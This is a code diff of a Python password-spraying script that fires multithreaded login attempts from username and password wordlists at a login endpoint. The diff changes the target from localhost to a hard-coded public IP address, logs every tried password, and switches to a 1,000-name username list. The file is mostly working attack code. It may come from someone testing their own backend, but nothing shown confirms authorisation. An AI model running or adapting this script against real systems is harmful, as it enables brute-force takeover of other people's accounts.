@@ -3,7 +3,7 @@ import requests
 from concurrent.futures import ThreadPoolExecutor
 
 # Set the correct target URL for the login endpoint on your backend
-url = "http://localhost:5050/login"
+url = "http://34.224.51.201:5050/login"
 
 # Define headers (optional)
 headers = {
@@ -37,13 +37,13 @@ def attempt_login(username, password):
         elif response.status_code == 302:  # Redirect (could indicate success in some systems)
             print(f"[+] Successful login with {username}:{password} (Redirect to: {response.headers.get('Location', 'unknown')})")
         elif response.status_code == 401:
-            print(f"[-] Failed login for {username} (Status Code: 401 Unauthorized)")
+            print(f"[-] Failed login for {username}:{password} (Status Code: 401 Unauthorized)")
         elif response.status_code == 403:
-            print(f"[-] Failed login for {username} (Status Code: 403 Forbidden)")
+            print(f"[-] Failed login for {username}:{password} (Status Code: 403 Forbidden)")
         else:
-            print(f"[-] Failed login for {username} (Status Code: {response.status_code})")
+            print(f"[-] Failed login for {username}:{password} (Status Code: {response.status_code})")
     except Exception as e:
-        print(f"[-] Error occurred for {username}: {e}")
+        print(f"[-] Error occurred for {username}:{password}: {e}")
 
 # Function to perform password spraying
 def password_spray(usernames, passwords):
@@ -60,12 +60,23 @@ if __name__ == "__main__":
     base_dir = os.path.dirname(os.path.abspath(__file__))
 
     # Build paths relative to the script's directory
-    username_file_path = os.path.join(base_dir, 'data', 'TestInput', 'top-usernames.txt')
-    password_file_path = os.path.join(base_dir, 'data', 'TestInput', 'rockyou-500.txt')
+    # username_file_path = os.path.join(base_dir, 'data', 'TestInputSmall', 'username.txt')
+    # password_file_path = os.path.join(base_dir, 'data', 'TestInputSmall', 'password.txt')
+
+    # BIG TEST
+    username_file_path = os.path.join(base_dir, 'data', 'TestInput', 'top_1000_usernames.txt')
+    password_file_path = os.path.join(base_dir, 'data', 'TestInputSmall', 'password.txt')
 
     # Read the usernames and passwords from files
     usernames = read_usernames(username_file_path)
     passwords = read_passwords(password_file_path)
+
+    # FOR TEST PURPOSES
+    # usernames = ['admin']
+    # passwords = ['password']
+
+    # print(usernames)
+    # print(passwords)
 
     # Run the password spray
     password_spray(usernames, passwords)
